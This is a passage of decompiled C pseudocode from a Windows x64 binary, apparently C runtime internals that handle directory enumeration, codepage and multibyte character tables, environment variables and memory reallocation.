  char v18; // [rsp+5Dh] [rbp-14Bh]
  char v19; // [rsp+5Eh] [rbp-14Ah]

  for ( i = 0x200000000801i64; a2 != (_BYTE *)a1; a2 = (_BYTE *)sub_13F176BB8(a1, (unsigned __int64)a2) )
  {
    v6 = *a2 - 47;
    if ( v6 <= 0x2Du && _bittest64(&i, (char)v6) )
      break;
  }
  if ( *a2 == 58 && a2 != (_BYTE *)(a1 + 1) )
    return sub_13F1716F0(a1, 0i64, 0i64, (__int64)a3);
  v8 = *a2 - 47;
  v9 = 0;
  if ( v8 > 0x2Du || (v10 = 1, !_bittest64(&i, (char)v8)) )
    v10 = 0;
  v11 = (unsigned __int64)&a2[-a1 + 1] & -(__int64)(v10 != 0);
  sub_13F15EF70((__int64)v16, 0, 0x140ui64);
  v12 = MEMORY[0x76FBC7F0](a1, 0i64, v16, 0i64, 0i64, 0);
  if ( v12 == -1 )
  {
    v13 = sub_13F1716F0(a1, 0i64, 0i64, (__int64)a3);
  }
  else
  {
    v14 = (__int64)(a3[1] - *a3) >> 3;
    while ( 1 )
    {
      if ( v17 != 46 || v18 && (v18 != 46 || v19) )
      {
        v13 = sub_13F1716F0((__int64)&v17, a1, v11, (__int64)a3);
        if ( v13 )
          break;
      }
      if ( !(unsigned int)MEMORY[0x76FBC7C0](v12, v16) )
      {
        v15 = (__int64)(a3[1] - *a3) >> 3;
        if ( v14 != v15 )
          sub_13F176710(*a3 + 8 * v14, v15 - v14, 8ui64, (int (__fastcall *)(unsigned __int64, _BYTE *))sub_13F1714D0);
        goto LABEL_14;
      }
    }
  }
  v9 = v13;
LABEL_14:
  if ( v12 != -1 )
    MEMORY[0x76F8B190](v12);
  return v9;
}

//----- (000000013F1719AC) ----------------------------------------------------
__int64 __fastcall sub_13F1719AC(__int64 *a1)
{
  __int64 v1; // rsi
  unsigned int v4; // ebx
  __int64 v5; // rax
  unsigned __int64 v6; // rsi
  __int64 v7; // rax

  v1 = a1[2];
  if ( a1[1] != v1 )
    return 0i64;
  v4 = 0;
  if ( !*a1 )
  {
    *a1 = sub_13F16E6BC(4ui64, 8ui64);
    sub_13F16E734(0i64);
    v5 = *a1;
    if ( *a1 )
    {
      a1[1] = v5;
      a1[2] = v5 + 32;
      return 0i64;
    }
    return 12i64;
  }
  v6 = (v1 - *a1) >> 3;
  if ( v6 > 0x7FFFFFFFFFFFFFFFi64 )
    return 12i64;
  v7 = sub_13F172A7C(*a1, 2 * v6, 8i64);
  if ( v7 )
  {
    *a1 = v7;
    a1[1] = v7 + 8 * v6;
    a1[2] = v7 + 16 * v6;
  }
  else
  {
    v4 = 12;
  }
  sub_13F16E734(0i64);
  return v4;
}
// 13F172A7C: using guessed type __int64 __fastcall sub_13F172A7C(_QWORD, _QWORD, _QWORD);

//----- (000000013F171A7C) ----------------------------------------------------
void __fastcall sub_13F171A7C(__int64 a1, __int64 a2, __int64 a3)
{
  sub_13F170628();
  sub_13F171AB4(a3);
  sub_13F17067C();
}

//----- (000000013F171AB4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
volatile signed __int32 *__fastcall sub_13F171AB4(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rdi
  __int64 *v4; // rcx
  _OWORD *v5; // rax
  __int64 v6; // rdx
  __int128 v7; // xmm1
  __int64 *v8; // rcx
  _OWORD *v9; // rax
  __int128 v10; // xmm1
  volatile signed __int32 *result; // rax

  dword_13F1C6A44 = *(_DWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136i64) + 4i64);
  dword_13F1C6A48 = *(_DWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136i64) + 8i64);
  qword_13F1C6A60 = *(_QWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136i64) + 544i64);
  v2 = *(_QWORD *)(**(_QWORD **)a1 + 136i64) + 12i64;
  if ( *(_QWORD *)(**(_QWORD **)a1 + 136i64) == -12i64 )
  {
    qword_13F1C6A50 = 0i64;
    dword_13F1C6A58 = 0;
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
  }
  else
  {
    qword_13F1C6A50 = *(_QWORD *)v2;
    dword_13F1C6A58 = *(_DWORD *)(v2 + 8);
  }
  v3 = 2i64;
  v4 = qword_13F1B7950;
  v5 = (_OWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136i64) + 24i64);
  if ( *(_QWORD *)(**(_QWORD **)a1 + 136i64) == -24i64 )
  {
    sub_13F15EF70((__int64)qword_13F1B7950, 0, 0x101ui64);
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
  }
  else
  {
    v6 = 2i64;
    do
    {
      *(_OWORD *)v4 = *v5;
      *((_OWORD *)v4 + 1) = v5[1];
      *((_OWORD *)v4 + 2) = v5[2];
      *((_OWORD *)v4 + 3) = v5[3];
      *((_OWORD *)v4 + 4) = v5[4];
      *((_OWORD *)v4 + 5) = v5[5];
      *((_OWORD *)v4 + 6) = v5[6];
      v4 += 16;
      v7 = v5[7];
      v5 += 8;
      *((_OWORD *)v4 - 1) = v7;
      --v6;
    }
    while ( v6 );
    *(_BYTE *)v4 = *(_BYTE *)v5;
  }
  v8 = qword_13F1B7A60;
  v9 = (_OWORD *)(*(_QWORD *)(**(_QWORD **)a1 + 136i64) + 281i64);
  if ( *(_QWORD *)(**(_QWORD **)a1 + 136i64) == -281i64 )
  {
    sub_13F15EF70((__int64)qword_13F1B7A60, 0, 0x100ui64);
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
  }
  else
  {
    do
    {
      *(_OWORD *)v8 = *v9;
      *((_OWORD *)v8 + 1) = v9[1];
      *((_OWORD *)v8 + 2) = v9[2];
      *((_OWORD *)v8 + 3) = v9[3];
      *((_OWORD *)v8 + 4) = v9[4];
      *((_OWORD *)v8 + 5) = v9[5];
      *((_OWORD *)v8 + 6) = v9[6];
      v8 += 16;
      v10 = v9[7];
      v9 += 8;
      *((_OWORD *)v8 - 1) = v10;
      --v3;
    }
    while ( v3 );
  }
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)0x3C38E0, 0xFFFFFFFF) == 1
    && qword_13F1B7620 != (__int64 *)3946720 )
  {
    sub_13F16E734(3946720i64);
  }
  qword_13F1B7848 = *(_QWORD *)(**(_QWORD **)a1 + 136i64);
  result = *(volatile signed __int32 **)(**(_QWORD **)a1 + 136i64);
  _InterlockedIncrement(result);
  return result;
}
// 13F171AD6: write access to const memory at 13F1C6A44 has been detected
// 13F171AEC: write access to const memory at 13F1C6A48 has been detected
// 13F171B06: write access to const memory at 13F1C6A60 has been detected
// 13F171B24: write access to const memory at 13F1C6A50 has been detected
// 13F171B2F: write access to const memory at 13F1C6A58 has been detected
// 13F171B39: write access to const memory at 13F1C6A50 has been detected
// 13F171B40: write access to const memory at 13F1C6A58 has been detected
// 13F171CA4: write access to const memory at 13F1B7848 has been detected
// 13F1B7620: using guessed type __int64 qword_13F1B7620[11];
// 13F1B7848: using guessed type __int64 qword_13F1B7848;
// 13F1B7950: using guessed type __int64 qword_13F1B7950[8];
// 13F1B7A60: using guessed type __int64 qword_13F1B7A60[8];
// 13F1C6A44: using guessed type int dword_13F1C6A44;
// 13F1C6A48: using guessed type int dword_13F1C6A48;
// 13F1C6A50: using guessed type __int64 qword_13F1C6A50;
// 13F1C6A58: using guessed type int dword_13F1C6A58;
// 13F1C6A60: using guessed type __int64 qword_13F1C6A60;

//----- (000000013F171CCC) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F171CCC(unsigned int a1)
{
  unsigned int v2; // eax
  __int64 v4[3]; // [rsp+20h] [rbp-28h] BYREF
  char v5; // [rsp+38h] [rbp-10h]

  sub_13F1687CC((__int64)v4, 0i64);
  dword_13F1C6A5C = 0;
  switch ( a1 )
  {
    case 0xFFFFFFFE:
      dword_13F1C6A5C = 1;
      v2 = MEMORY[0x76F8A9B0]();
LABEL_5:
      a1 = v2;
      break;
    case 0xFFFFFFFD:
      dword_13F1C6A5C = 1;
      v2 = MEMORY[0x76F86430]();
      goto LABEL_5;
    case 0xFFFFFFFC:
      dword_13F1C6A5C = 1;
      a1 = *(_DWORD *)(v4[1] + 12);
      break;
  }
  if ( v5 )
    *(_DWORD *)(v4[0] + 936) &= ~2u;
  return a1;
}
// 13F171CE0: write access to const memory at 13F1C6A5C has been detected
// 13F171CEC: write access to const memory at 13F1C6A5C has been detected
// 13F171D03: write access to const memory at 13F1C6A5C has been detected
// 13F171D21: write access to const memory at 13F1C6A5C has been detected
// 13F1C6A5C: using guessed type int dword_13F1C6A5C;

//----- (000000013F171D4C) ----------------------------------------------------
char __fastcall sub_13F171D4C(__int64 a1)
{
  _BYTE *v1; // rbx
  __int64 v3; // rbp
  _WORD *v4; // rdi
  __int64 v5; // rcx
  char *v6; // rdi
  _BYTE *v7; // rcx
  __int64 v8; // rdx
  char result; // al

  v1 = (_BYTE *)(a1 + 24);
  v3 = 257i64;
  sub_13F15EF70(a1 + 24, 0, 0x101ui64);
  v4 = (_WORD *)(a1 + 12);
  *(_QWORD *)(a1 + 4) = 0i64;
  v5 = 6i64;
  *(_QWORD *)(a1 + 544) = 0i64;
  while ( v5 )
  {
    *v4++ = 0;
    --v5;
  }
  v6 = (char *)qword_13F1B7620 - a1;
  do
  {
    *v1 = v1[(_QWORD)v6];
    ++v1;
    --v3;
  }
  while ( v3 );
  v7 = (_BYTE *)(a1 + 281);
  v8 = 256i64;
  do
  {
    result = v6[(_QWORD)v7];
    *v7++ = result;
    --v8;
  }
  while ( v8 );
  return result;
}
// 13F1B7620: using guessed type __int64 qword_13F1B7620[11];

//----- (000000013F171DDC) ----------------------------------------------------
char __fastcall sub_13F171DDC(__int64 a1)
{
  __int64 v2; // rbx
  unsigned int v3; // eax
  char *v4; // rcx
  unsigned __int8 v5; // al
  unsigned __int8 *v6; // rdx
  unsigned int v7; // er8
  __int64 i; // rcx
  unsigned int v9; // eax
  char *v10; // rdx
  _BYTE *j; // rcx
  unsigned int v12; // edx
  _BYTE *v13; // rcx
  char v15[6]; // [rsp+50h] [rbp-B0h] BYREF
  unsigned __int8 v16; // [rsp+56h] [rbp-AAh] BYREF
  char v17[256]; // [rsp+70h] [rbp-90h] BYREF
  char v18[256]; // [rsp+170h] [rbp+70h] BYREF
  char v19[256]; // [rsp+270h] [rbp+170h] BYREF
  char v20[1024]; // [rsp+370h] [rbp+270h] BYREF

  v2 = 256i64;
  if ( (unsigned int)MEMORY[0x76F86180](*(unsigned int *)(a1 + 4), v15) )
  {
    v3 = 0;
    v4 = v17;
    do
      *v4++ = v3++;
    while ( v3 < 0x100 );
    v5 = v16;
    v6 = &v16;
    v17[0] = 32;
    while ( v5 )
    {
      v7 = v6[1];
      for ( i = v5; (unsigned int)i <= v7 && (unsigned int)i < 0x100; i = (unsigned int)(i + 1) )
        v17[i] = 32;
      v6 += 2;
      v5 = *v6;
    }
    sub_13F173550(0i64, 1u, (__int64)v17, 0x100u, (__int64)v20, *(_DWORD *)(a1 + 4), 0);
    sub_13F17102C(0i64, *(_QWORD *)(a1 + 544), 0x100u, v17, 256, (__int64)v18, 256, *(_DWORD *)(a1 + 4), 0);
    LOBYTE(v9) = sub_13F17102C(0i64, *(_QWORD *)(a1 + 544), 0x200u, v17, 256, (__int64)v19, 256, *(_DWORD *)(a1 + 4), 0);
    v10 = v20;
    for ( j = (_BYTE *)(a1 + 25); ; ++j )
    {
      if ( (*v10 & 1) != 0 )
      {
        *j |= 0x10u;
        LOBYTE(v9) = v18[(_QWORD)j - a1 - 25];
      }
      else
      {
        if ( (*v10 & 2) == 0 )
        {
          j[256] = 0;
          goto LABEL_18;
        }
        *j |= 0x20u;
        LOBYTE(v9) = v19[(_QWORD)j - a1 - 25];
      }
      j[256] = v9;
LABEL_18:
      v10 += 2;
      if ( !--v2 )
        return v9;
    }
  }
  v12 = 0;
  v13 = (_BYTE *)(a1 + 25);
  do
  {
    v9 = v12 - 97 + 32;
    if ( v9 <= 0x19 )
    {
      *v13 |= 0x10u;
      LOBYTE(v9) = v12 + 32;
LABEL_25:
      v13[256] = v9;
      goto LABEL_27;
    }
    if ( v12 - 97 <= 0x19 )
    {
      *v13 |= 0x20u;
      LOBYTE(v9) = v12 - 32;
      goto LABEL_25;
    }
    v13[256] = 0;
LABEL_27:
    ++v12;
    ++v13;
  }
  while ( v12 < 0x100 );
  return v9;
}
// 13F171DDC: using guessed type char var_730[6];
// 13F171DDC: using guessed type char var_710[256];

//----- (000000013F171FC0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F171FC0(unsigned int a1, char a2)
{
  unsigned int v4; // edi
  __int64 v6; // rax
  _DWORD *v7; // rbx
  __int64 v8; // rdx
  _OWORD *v9; // rcx
  _OWORD *v10; // rax
  __int128 v11; // xmm1
  unsigned int v12; // edi
  __int64 *v13; // rcx
  _DWORD *v14; // rcx
  int v15; // [rsp+20h] [rbp-20h] BYREF
  __int64 v16; // [rsp+28h] [rbp-18h] BYREF
  __int64 *v17; // [rsp+30h] [rbp-10h] BYREF
  char v18; // [rsp+70h] [rbp+30h] BYREF
  int v19; // [rsp+78h] [rbp+38h]

  v16 = sub_13F16E528();
  sub_13F1721A0();
  v4 = sub_13F171CCC(a1);
  if ( v4 == *(_DWORD *)(*(_QWORD *)(v16 + 136) + 4i64) )
    return 0i64;
  v6 = sub_13F16F1F8(0x228ui64);
  v7 = (_DWORD *)v6;
  if ( v6 )
  {
    v8 = 4i64;
    v9 = (_OWORD *)v6;
    v10 = *(_OWORD **)(v16 + 136);
    do
    {
      *v9 = *v10;
      v9[1] = v10[1];
      v9[2] = v10[2];
      v9[3] = v10[3];
      v9[4] = v10[4];
      v9[5] = v10[5];
      v9[6] = v10[6];
      v9 += 8;
      v11 = v10[7];
      v10 += 8;
      *(v9 - 1) = v11;
      --v8;
    }
    while ( v8 );
    *v9 = *v10;
    v9[1] = v10[1];
    *((_QWORD *)v9 + 4) = *((_QWORD *)v10 + 4);
    *v7 = 0;
    v12 = sub_13F172260(v4, (__int64)v7);
    if ( v12 != -1 )
    {
      if ( !a2 )
        sub_13F16D300();
      if ( _InterlockedExchangeAdd(*(volatile signed __int32 **)(v16 + 136), 0xFFFFFFFF) == 1 )
      {
        v13 = *(__int64 **)(v16 + 136);
        if ( v13 != qword_13F1B7620 )
          sub_13F16E734((__int64)v13);
      }
      *v7 = 1;
      v14 = v7;
      v7 = 0i64;
      *(_QWORD *)(v16 + 136) = v14;
      if ( (*(_BYTE *)(v16 + 936) & 2) == 0 )
      {
        v17 = &v16;
        v19 = 5;
        v15 = 5;
        sub_13F171A7C((__int64)&v18, (__int64)&v15, (__int64)&v17);
        *((_QWORD *)&xmmword_13F1B7608 + 1) = 3946720i64;
      }
      goto LABEL_9;
    }
    *(_DWORD *)sub_13F169DAC() = 22;
  }
  v12 = -1;
LABEL_9:
  sub_13F16E734((__int64)v7);
  return v12;
}
// 13F172169: write access to const memory at 13F1B7610 has been detected
// 13F1B7608: using guessed type __int128 xmmword_13F1B7608;
// 13F1B7620: using guessed type __int64 qword_13F1B7620[11];
// 13F1B7848: using guessed type __int64 qword_13F1B7848;

//----- (000000013F172178) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F172178()
{
  return 1;
}
// 13F172191: write access to const memory at 13F1C6A68 has been detected

//----- (000000013F1721A0) ----------------------------------------------------
__int64 sub_13F1721A0()
{
  __int64 v0; // rax
  __int64 v1; // rdi
  __int64 v2; // rbx

  v0 = sub_13F16E528();
  v1 = v0;
  if ( (*(_DWORD *)(v0 + 936) & 0xFFFFFFFE) != 0 && *(_QWORD *)(v0 + 144) )
  {
    v2 = *(_QWORD *)(v0 + 136);
  }
  else
  {
    sub_13F170628();
    v2 = *(_QWORD *)(v1 + 136);
    if ( v2 != 3946720 )
    {
      if ( v2
        && _InterlockedExchangeAdd((volatile signed __int32 *)v2, 0xFFFFFFFF) == 1
        && (__int64 *)v2 != qword_13F1B7620 )
      {
        sub_13F16E734(v2);
      }
      *(_QWORD *)(v1 + 136) = 3946720i64;
      _InterlockedIncrement((volatile signed __int32 *)0x3C38E0);
      v2 = 3946720i64;
    }
    sub_13F17067C();
  }
  if ( !v2 )
    sub_13F16DDAC();
  return v2;
}
// 13F1B7620: using guessed type __int64 qword_13F1B7620[11];

//----- (000000013F172260) ----------------------------------------------------
__int64 __fastcall sub_13F172260(unsigned int a1, __int64 a2)
{
  const wchar_t *v3; // rsi
  unsigned int v4; // edi
  unsigned int v5; // ebp
  __int64 *v6; // rax
  char *v7; // rcx
  unsigned int v8; // eax
  unsigned int v9; // edx
  __int64 v10; // rdi
  __int64 v11; // rdx
  _BYTE *v12; // rax
  __int64 v13; // rcx
  const wchar_t *v14; // rax
  _WORD *v15; // rdi
  __int64 j; // rcx
  __int64 v18; // rax
  __int64 *v19; // r14
  __int64 v20; // rbp
  __int64 *v21; // r9
  __int64 *i; // rdx
  unsigned int v23; // er8
  __int64 v24; // r10
  unsigned int v25; // edi
  unsigned int v26; // edi
  unsigned int v27; // edi
  _WORD *v28; // rcx
  __int64 v29; // rdx
  int v30; // [rsp+20h] [rbp-48h] BYREF
  char v31; // [rsp+26h] [rbp-42h] BYREF

  v3 = 0i64;
  v4 = sub_13F171CCC(a1);
  if ( v4 )
  {
    v5 = 0;
    v6 = qword_13F1B7860;
    do
    {
      if ( *(_DWORD *)v6 == v4 )
      {
        sub_13F15EF70(a2 + 24, 0, 0x101ui64);
        v18 = v5;
        v19 = qword_13F1B7850;
        v20 = 4i64;
        v21 = &qword_13F1B7860[6 * v18 + 2];
        do
        {
          for ( i = v21; *(_BYTE *)i; i = (__int64 *)((char *)i + 2) )
          {
            if ( !*((_BYTE *)i + 1) )
              break;
            v23 = *(unsigned __int8 *)i;
            if ( v23 <= *((unsigned __int8 *)i + 1) )
            {
              v24 = v23 + 1;
              do
              {
                if ( (unsigned int)v24 >= 0x101 )
                  break;
                ++v23;
                *(_BYTE *)(v24 + a2 + 24) |= *(_BYTE *)v19;
                v24 = (unsigned int)(v24 + 1);
              }
              while ( v23 <= *((unsigned __int8 *)i + 1) );
            }
          }
          ++v21;
          v19 = (__int64 *)((char *)v19 + 1);
          --v20;
        }
        while ( v20 );
        *(_DWORD *)(a2 + 4) = v4;
        *(_DWORD *)(a2 + 8) = 1;
        v25 = v4 - 932;
        if ( v25 )
        {
          v26 = v25 - 4;
          if ( v26 )
          {
            v27 = v26 - 13;
            if ( v27 )
            {
              if ( v27 == 1 )
                v3 = L"zh-TW";
            }
            else
            {
              v3 = L"ko-KR";
            }
          }
          else
          {
            v3 = L"zh-CN";
          }
        }
        else
        {
          v3 = L"ja-JP";
        }
        *(_QWORD *)(a2 + 544) = v3;
        v28 = (_WORD *)(a2 + 12);
        v29 = 6i64;
        do
        {
          *v28 = *(_WORD *)((char *)v28 + (_QWORD)qword_13F1B7860 + 48 * v18 - a2 - 8);
          ++v28;
          --v29;
        }
        while ( v29 );
        goto LABEL_53;
      }
      ++v5;
      v6 += 6;
    }
    while ( v5 < 5 );
    if ( v4 - 65000 <= 1
      || !(unsigned int)MEMORY[0x76F88530]((unsigned __int16)v4)
      || !(unsigned int)MEMORY[0x76F86180](v4, &v30) )
    {
      return 0xFFFFFFFFi64;
    }
    sub_13F15EF70(a2 + 24, 0, 0x101ui64);
    *(_DWORD *)(a2 + 4) = v4;
    *(_QWORD *)(a2 + 544) = 0i64;
    if ( (unsigned int)v30 <= 1 )
    {
      *(_DWORD *)(a2 + 8) = 0;
    }
    else
    {
      v7 = &v31;
      if ( v31 )
      {
        do
        {
          if ( !v7[1] )
            break;
          v8 = (unsigned __int8)v7[1];
          v9 = (unsigned __int8)*v7;
          if ( v9 <= v8 )
          {
            v10 = v9 + 1;
            v11 = v8 - v9 + 1;
            do
            {
              *(_BYTE *)(v10 + a2 + 24) |= 4u;
              v10 = (unsigned int)(v10 + 1);
              --v11;
            }
            while ( v11 );
          }
          v7 += 2;
        }
        while ( *v7 );
      }
      v12 = (_BYTE *)(a2 + 26);
      v13 = 254i64;
      do
      {
        *v12++ |= 8u;
        --v13;
      }
      while ( v13 );
      switch ( *(_DWORD *)(a2 + 4) )
      {
        case 0x3A4:
          v14 = L"ja-JP";
          break;
        case 0x3A8:
          v14 = L"zh-CN";
          break;
        case 0x3B5:
          v14 = L"ko-KR";
          break;
        case 0x3B6:
          v14 = L"zh-TW";
          break;
        default:
          v14 = 0i64;
          break;
      }
      *(_QWORD *)(a2 + 544) = v14;
      *(_DWORD *)(a2 + 8) = 1;
    }
    v15 = (_WORD *)(a2 + 12);
    for ( j = 6i64; j; --j )
      *v15++ = 0;
LABEL_53:
    sub_13F171DDC(a2);
  }
  else
  {
    sub_13F171D4C(a2);
  }
  return 0i64;
}
// 13F192298: using guessed type wchar_t aJaJp[6];
// 13F1922A8: using guessed type wchar_t aZhCn[6];
// 13F1922B8: using guessed type wchar_t aKoKr[6];
// 13F1922C8: using guessed type wchar_t aZhTw[6];
// 13F1B7850: using guessed type __int64 qword_13F1B7850[2];
// 13F1B7860: using guessed type __int64 qword_13F1B7860[10];
// 13F1C6A5C: using guessed type int dword_13F1C6A5C;
// 13F172260: using guessed type unsigned int var_48;

//----- (000000013F172508) ----------------------------------------------------
__int64 __fastcall sub_13F172508(__int128 *a1, unsigned __int8 a2, int a3, unsigned __int8 a4)
{
  __int64 result; // rax
  __int64 v8[3]; // [rsp+20h] [rbp-28h] BYREF
  char v9; // [rsp+38h] [rbp-10h]

  sub_13F1687CC((__int64)v8, a1);
  if ( (a4 & *(_BYTE *)(a2 + v8[2] + 25)) != 0
    || (!a3 ? (result = 0i64) : (result = (unsigned __int16)(a3 & *(_WORD *)(*(_QWORD *)v8[1] + 2i64 * a2))),
        (_DWORD)result) )
  {
    result = 1i64;
  }
  if ( v9 )
    *(_DWORD *)(v8[0] + 936) &= ~2u;
  return result;
}

//----- (000000013F172580) ----------------------------------------------------
__int64 __fastcall sub_13F172580(unsigned __int8 a1)
{
  return sub_13F172508(0i64, a1, 0, 4u);
}

//----- (000000013F172594) ----------------------------------------------------
__int64 sub_13F172594()
{
  __int64 v0; // rax
  __int64 v1; // rbx
  _WORD *i; // rsi
  __int64 v3; // rax
  __int64 v4; // rsi
  int v5; // eax
  int v6; // ebp
  __int64 v7; // rax
  __int64 v8; // rdi
  __int64 v9; // rsi

  v0 = MEMORY[0x76F861C0]();
  v1 = v0;
  if ( !v0 )
    goto LABEL_12;
  for ( i = (_WORD *)v0; *i; i += v3 + 1 )
  {
    v3 = -1i64;
    do
      ++v3;
    while ( i[v3] );
  }
  v4 = ((__int64)i - v1 + 2) >> 1;
  v5 = MEMORY[0x76F91F80](0i64, 0i64, v1, (unsigned int)v4, 0i64, 0, 0i64, 0i64);
  v6 = v5;
  if ( v5 )
  {
    v7 = sub_13F16F1F8(v5);
    v8 = v7;
    if ( v7 && (unsigned int)MEMORY[0x76F91F80](0i64, 0i64, v1, (unsigned int)v4, v7, v6, 0i64, 0i64) )
    {
      v9 = v8;
      v8 = 0i64;
    }
    else
    {
      v9 = 0i64;
    }
    sub_13F16E734(v8);
  }
  else
  {
LABEL_12:
    v9 = 0i64;
  }
  if ( v1 )
    MEMORY[0x76F861A0](v1);
  return v9;
}

//----- (000000013F172698) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F172698(unsigned __int8 *a1, int a2)
{
  unsigned int v2; // esi
  unsigned __int8 *v5; // rdi
  unsigned __int8 *v6; // rax
  unsigned __int8 *v7; // r13
  bool v8; // bp
  unsigned __int8 **v9; // r14
  int v10; // ebp
  int v11; // ebp
  unsigned __int8 **v12; // rbx
  signed __int64 v13; // r12
  bool i; // zf
  __int64 v15; // rbx
  __int64 v16; // rbx
  unsigned __int64 v17; // rbx
  unsigned __int64 v18; // rdx
  __int64 v19; // r14
  __int64 v20; // r14
  _BYTE *v21; // rax
  __int64 v22; // rbx
  __int64 v23; // rdx

  v2 = 0;
  if ( !a1 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    return -1i64;
  }
  v5 = a1;
  v6 = (unsigned __int8 *)sub_13F17935C((__int64)a1, 0x3Du);
  v7 = v6;
  if ( !v6 || v6 == a1 )
  {
    v2 = -1;
    *(_DWORD *)sub_13F169DAC() = 22;
    goto LABEL_8;
  }
  v8 = v6[1] == 0;
  v9 = (unsigned __int8 **)sub_13F172988((__int64 *)0x3CE400);
  qword_13F1C61A8 = (__int64)v9;
  if ( v9 )
  {
    v12 = v9;
    v13 = v7 - a1;
    for ( i = *v9 == 0i64; !i; i = *v12 == 0i64 )
    {
      if ( !(unsigned int)sub_13F176C70(a1, *v12, v7 - a1) && ((*v12)[v13] == 61 || !(*v12)[v13]) )
      {
        v15 = v12 - v9;
        goto LABEL_23;
      }
      ++v12;
    }
    v15 = -(v12 - v9);
LABEL_23:
    if ( v15 >= 0 && *v9 )
    {
      sub_13F16E734((__int64)v9[v15]);
      if ( v8 )
      {
        while ( v9[v15] )
        {
          v9[v15] = v9[v15 + 1];
          ++v15;
        }
        v16 = sub_13F172A7C(v9, v15, 8i64);
        sub_13F16E734(0i64);
        if ( v16 )
          qword_13F1C61A8 = v16;
        goto LABEL_38;
      }
      v9[v15] = a1;
    }
    else
    {
      if ( v8 )
        goto LABEL_10;
      v17 = -v15;
      v18 = v17 + 2;
      if ( v17 + 2 < v17
        || v18 >= 0x1FFFFFFFFFFFFFFFi64
        || (v19 = sub_13F172A7C(v9, v18, 8i64), sub_13F16E734(0i64), !v19) )
      {
        v11 = -1;
        goto LABEL_11;
      }
      *(_QWORD *)(v19 + 8 * v17) = a1;
      *(_QWORD *)(v19 + 8 * v17 + 8) = 0i64;
      qword_13F1C61A8 = v19;
    }
    v5 = 0i64;
LABEL_38:
    if ( a2 )
    {
      v20 = -1i64;
      do
        ++v20;
      while ( a1[v20] );
      v21 = (_BYTE *)sub_13F16E6BC(v20 + 2, 1ui64);
      v22 = (__int64)v21;
      if ( v21 )
      {
        if ( (unsigned int)sub_13F16DD4C(v21, v20 + 2, (__int64)a1) )
        {
          sub_13F1682F0();
          JUMPOUT(0x13F172984i64);
        }
        v23 = (__int64)&v7[v22 - (_QWORD)a1 + 1];
        v7[v22 - (_QWORD)a1] = 0;
        if ( v8 )
          v23 = 0i64;
        if ( !(unsigned int)MEMORY[0x76FBC200](v22, v23) )
        {
          v2 = -1;
          *(_DWORD *)sub_13F169DAC() = 42;
        }
      }
      sub_13F16E734(v22);
    }
    goto LABEL_12;
  }
  if ( !v8 )
  {
    qword_13F1C61A8 = sub_13F16E6BC(1ui64, 8ui64);
    sub_13F16E734(0i64);
    qword_13F1C61B0 = sub_13F16E6BC(1ui64, 8ui64);
    sub_13F16E734(0i64);
    v10 = -1;
    goto LABEL_9;
  }
LABEL_8:
  v10 = v2;
LABEL_9:
  v2 = v10;
LABEL_10:
  v11 = v2;
LABEL_11:
  v2 = v11;
LABEL_12:
  sub_13F16E734((__int64)v5);
  return v2;
}
// 13F17297F: control flows out of bounds to 13F172984
// 13F172712: write access to const memory at 13F1C61A8 has been detected
// 13F172790: write access to const memory at 13F1C61A8 has been detected
// 13F1727C6: write access to const memory at 13F1C61B0 has been detected
// 13F172886: write access to const memory at 13F1C61A8 has been detected
// 13F1728E2: write access to const memory at 13F1C61A8 has been detected
// 13F16CAC8: using guessed type __int64 sub_13F16CAC8(void);
// 13F172A7C: using guessed type __int64 __fastcall sub_13F172A7C(_QWORD, _QWORD, _QWORD);
// 13F1C61A8: using guessed type __int64 qword_13F1C61A8;
// 13F1C61B0: using guessed type __int64 qword_13F1C61B0;

//----- (000000013F172988) ----------------------------------------------------
__int64 __fastcall sub_13F172988(__int64 *a1)
{
  __int64 *v1; // rdi
  __int64 v3; // rcx
  __int64 *i; // rax
  __int64 v5; // rax
  __int64 v6; // rbx
  __int64 v7; // r14
  __int64 v8; // rsi
  _BYTE *v9; // rcx

  v1 = a1;
  if ( !a1 )
    return 0i64;
  v3 = 0i64;
  for ( i = v1; *i; ++i )
    ++v3;
  v5 = sub_13F16E6BC(v3 + 1, 8ui64);
  v6 = v5;
  if ( !v5 )
    sub_13F16DDAC();
  if ( *v1 )
  {
    v7 = v5 - (_QWORD)v1;
    do
    {
      v8 = -1i64;
      do
        ++v8;
      while ( *(_BYTE *)(*v1 + v8) );
      *(__int64 *)((char *)v1 + v7) = sub_13F16E6BC(v8 + 1, 1ui64);
      sub_13F16E734(0i64);
      v9 = *(_BYTE **)((char *)v1 + v7);
      if ( !v9 )
        sub_13F16DDAC();
      if ( (unsigned int)sub_13F16DD4C(v9, v8 + 1, *v1) )
      {
        sub_13F1682F0();
        __debugbreak();
      }
      ++v1;
    }
    while ( *v1 );
  }
  sub_13F16E734(0i64);
  return v6;
}

//----- (000000013F172A84) ----------------------------------------------------
__int64 __fastcall sub_13F172A84(__int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v7; // rdi
  unsigned __int64 v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rsi

  if ( a2 && 0xFFFFFFFFFFFFFFE0ui64 / a2 < a3 )
  {
    *(_DWORD *)sub_13F169DAC() = 12;
    return 0i64;
  }
  else
  {
    if ( a1 )
      v7 = sub_13F170B14(a1);
    else
      v7 = 0i64;
    v8 = a3 * a2;
    v9 = sub_13F176D88(a1, v8);
    v10 = v9;
    if ( v9 )
    {
      if ( v7 < v8 )
        sub_13F15EF70(v9 + v7, 0, v8 - v7);
    }
    return v10;
  }
}

//----- (000000013F172B1C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F172B1C()
{
  qword_13F1C6A70 = MEMORY[0x76F919E0]();
  return 1;
}
